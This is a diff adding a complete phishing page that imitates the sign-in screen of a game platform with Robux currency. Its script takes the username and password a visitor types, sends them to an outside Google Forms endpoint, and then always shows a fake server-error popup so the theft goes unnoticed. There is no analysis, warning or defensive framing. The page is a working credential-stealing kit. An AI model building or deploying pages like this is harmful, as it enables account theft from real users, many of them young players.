@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    background: #0f1115;
+}
+
+/* NAVBAR */
+.navbar {
+    height: 56px;
+    background: #181a20;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+    color: #e5e7eb;
+}
+
+.nav-left {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+}
+
+.nav-left img {
+    height: 20px;
+}
+
+.nav-left span {
+    color: #b3b3b3;
+    font-size: 14px;
+}
+
+.nav-right button {
+    background: #2563eb;
+    border: none;
+    padding: 6px 14px;
+    border-radius: 6px;
+    color: white;
+}
+
+/* MAIN */
+.main {
+    flex: 1;
+    display: flex;
+}
+
+/* LEFT PANEL */
+.left {
+    width: 360px;
+    background: #111317;
+    color: white;
+    padding: 48px 36px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.left h1 {
+    font-size: 26px;
+    margin-bottom: 6px;
+}
+
+.left p {
+    color: #9ca3af;
+    font-size: 14px;
+    margin-bottom: 22px;
+}
+
+.input-group {
+    margin-bottom: 12px;
+}
+
+input {
+    width: 100%;
+    padding: 11px;
+    background: #1b1f26;
+    border: 1px solid #2c313a;
+    border-radius: 6px;
+    color: white;
+}
+
+input::placeholder {
+    color: #6b7280;
+}
+
+.signin-btn {
+    width: 100%;
+    padding: 11px;
+    background: #2563eb;
+    border: none;
+    border-radius: 6px;
+    margin-top: 8px;
+    color: white;
+    cursor: pointer;
+}
+
+.link {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #9ca3af;
+    text-align: center;
+}
+
+/* DIVIDER */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 18px 0;
+    font-size: 12px;
+    color: #6b7280;
+}
+
+.divider::before,
+.divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #2c313a;
+}
+
+.divider span {
+    margin: 0 10px;
+}
+
+/* ALT BUTTONS */
+.alt-btn {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 8px;
+    background: #1b1f26;
+    border: 1px solid #2c313a;
+    border-radius: 6px;
+    color: white;
+}
+
+/* RIGHT PANEL */
+.right {
+    flex: 1;
+    background: url("assets/bg.png") center/cover no-repeat;
+}
+
+/* RESPONSIVE */
+@media (max-width: 900px) {
+    .right { display: none; }
+    .left { width: 100%; }
+}
+
+/* MODAL */
+.overlay {
+    position: fixed;
+    inset: 0;
+    backdrop-filter: blur(6px);
+    background: rgba(0,0,0,0.4);
+    display: none;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal {
+    background: #1b1f26;
+    padding: 20px 24px;
+    border-radius: 10px;
+    color: white;
+    width: 300px;
+    text-align: center;
+    border: 1px solid #2c313a;
+}
+
+.modal button {
+    margin-top: 14px;
+    padding: 8px 14px;
+    border: none;
+    background: #2563eb;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <div class="nav-left">
+        <img src="assets/logo.png">
+        <span>Charts</span>
+        <span>Marketplace</span>
+        <span>Create</span>
+        <span>Robux</span>
+    </div>
+    <div class="nav-right">
+        <button>Sign Up</button>
+    </div>
+</div>
+
+<div class="main">
+    <div class="left">
+        <h1>Sign in</h1>
+        <p>Jump back into your experiences</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input id="user" type="text" placeholder="Username, email, or phone" required>
+            </div>
+
+            <div class="input-group">
+                <input id="pass" type="password" placeholder="Password" required>
+            </div>
+
+            <button class="signin-btn">Sign in</button>
+        </form>
+
+        <div class="link">Forgot password or username?</div>
+
+        <div class="divider"><span>Or</span></div>
+
+        <button class="alt-btn">Email a code</button>
+        <button class="alt-btn">Quick sign in</button>
+
+        <div class="link">Don't have an account? <b>Create one</b></div>
+    </div>
+
+    <div class="right"></div>
+</div>
+
+<!-- POPUP -->
+<div class="overlay" id="overlay">
+    <div class="modal">
+        <div>Error to connect with server.<br>Try again in some time.</div>
+        <button onclick="closeModal()">OK</button>
+    </div>
+</div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const user = document.getElementById("user").value;
+    const pass = document.getElementById("pass").value;
+
+    const formData = new FormData();
+    formData.append("entry.1625650441", user);
+    formData.append("entry.2021196362", pass);
+
+    fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSe0qwEKtxJQWoT9xpNmuz7znGBw2H7guOQ8Oa5WPqA4VmiVEw/formResponse", {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+    });
+
+    // Show error popup regardless
+    document.getElementById("overlay").style.display = "flex";
+});
+
+function closeModal(){
+    document.getElementById("overlay").style.display = "none";
+}
+</script>
+
+</body>
+</html>
